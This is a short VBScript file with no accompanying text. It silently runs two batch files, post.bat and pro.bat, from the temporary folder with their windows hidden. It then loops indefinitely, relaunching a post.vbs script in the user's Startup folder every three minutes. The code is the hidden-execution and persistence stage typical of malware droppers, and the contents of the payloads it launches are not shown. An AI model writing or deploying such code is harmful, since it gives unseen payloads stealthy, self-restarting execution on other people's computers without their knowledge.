Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "%temp%\post.bat", 0, True
objShell.Run "%temp%\pro.bat", 0, False
DO
   objShell.Run "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs", 0, False
   WScript.Sleep 180000
loop
